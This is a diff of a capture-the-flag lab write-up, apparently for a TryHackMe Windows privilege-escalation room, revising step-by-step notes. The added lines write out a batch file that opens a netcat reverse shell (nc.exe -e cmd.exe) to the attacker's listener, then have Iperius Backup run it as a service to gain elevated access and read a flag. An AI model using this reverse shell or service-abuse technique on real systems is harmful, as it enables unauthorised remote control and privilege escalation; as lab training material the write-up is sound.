@@ -85,36 +85,49 @@
 
 
 - Navigated to <code>THM Attackbox</code> virtual machine.<br>
-- Looked at the right upper corner and discovered my <code>AttackIP</code>:<code>10.10.72.55</code>.<br>
-- Launched <code>Command Prompt</code>.<br>
-- Practice also executing the command <code>ifconfig</code>, and confirmed the IP there in the <code>ens5</code> section.<br>
+- Looked at the right upper corner.<br>
+- Identified my <code>AttackIP</code>:<code>10.10.72.55</code>.<br>
+- Launched <code>Command Prompt</code>. I also practiced executing the command <code>ifconfig</code>, and confirmed my <code>AttackIP</code> in the <code>ens5</code> section. If you are using your own virtual machine, you will find it under <code>tun0</code>.<br>
 - Set up a listener using <code>nc -nlvp 1337</code>.<br>
 -----------------------------------<br>
-- Navigated to <code>Aoc_WinPrivEsc</code> virtual machine.<br>
-- Note: the <code>TargetIP</code> I am using is <code>10.10.203.205</code>.<br>
+- Navigated to <code>Aoc_WinPrivEsc</code> virtual machine related to the <code>TargetIP</code>:<code>10.10.203.205</code>.<br>
 - Launched <code>notepad</code><br><br>
-- Added content to a <code>notepad</code> file.<br>
-- Saved it as <code>evil.bat</code> in the <code>C:\Users\McSkidy\Desktop</code> path.<br>
-- Navigated to <code>Desktop</code>.<br>
-- Double-clicked <code>evil.bat</code>.<br>
------------------------------------<br>
-- Navigated to <code>THM Attackbox</code> virtual machine.<br>
------------------------------------<br>
-- Navigated to <code>Aoc_WinPrivEsc</code> virtual machine.<br>
-- Launched <code>Iperius Backup</code> application.<br>
-- Clicked <code>Create a New Backup Job</code>.<br>
-- Clicked <code>Add folder</code>.<br>
-- Clicked <code>Select</code>.<br>
-- Chose <code>C:\Users</code>.<br>
+- Added content to a <code>notepad</code> file named <code>evil.bat</code>.<br>
+  <code>@echo off</code><br>
+  <code>C:\Users\McSkidy\Downloads\nc.exe -nv 10.10.72.55 1337 -e cmd.exe</code><br>
+- Saved <code>evil.bat</code> in the <code>C:\Users\McSkidy\Desktop\</code> path.<br>
 - Clicked <code>OK</code>.<br>
-- Clicked <code>Next</code>.<br>
+-----------------------------------<br>
+- Launched <code>Iperius Backup</code> application.<br>
+- Clicked <code>Create a New Backup Job</code> in the <code>Items</code> tab.<br>
+- Clicked <code>Add/ edit destination folder</code>.<br>
+- Clicked <code>Select</code>.<br>
+- Chose <code>C:\Users\McSkidy\Documents</code>.<br>
+- Clicked <code>OK</code>.<br>
+-----------------------------------<br>
+- Navigated to the <code>Destinations</code> tabtab.<br>
+- Clicked <code>Add/ edit destination folder</code>.<br>
+- Clicked <code>Select</code>.<br>
+- Chose <code>C:\Users\McSkidy\Desktop</code>.<br>
+- Clicked <code>OK</code>.<br>
+-----------------------------------<br>
 - Navigated to the <code>Other processes</code> tab.<br>
 - Toggled <code>Run a program or open external file</code>.<br>
 - Clicked <code>Select</code>.<br>
 - Chose <code>C:\Users\McSkidy\Desktop\evil.bat</code>.<br>
-- Clicked <code>Next</code>, and <code>OK</code>.<br>
-- Typed <code>Plan</code> for the <code>Job name</code>, and clicked <code>OK</code>.<br>
-
+- Clicked <code>Open<code>.<br>
+- Clicked <code>Next</code>.<br>
+- Clicked <code>OK</code>.<br>
+- A new <code>Backup job</code> was created, named <code>Documents</code>.<br>
+- Right-clicked <code>Documents</code>.<br>
+- Clicked <code>Run backup as service</code>.<br>
+- Clicked <code>Yes</code>.<br>
+-----------------------------------<br>
+- Navigated to <code>THM Attackbox</code> virtual machine.<br>
+- Executed <code>whoami</code>.<br>
+- Navigated to <code>c:\Users\thegrinch\Documents</code>.<br>
+- Executed <code>type flag.txt</code>.<br>
+- Executed <code>type Schedule.txt</code>.</p>
 
 <br>
 
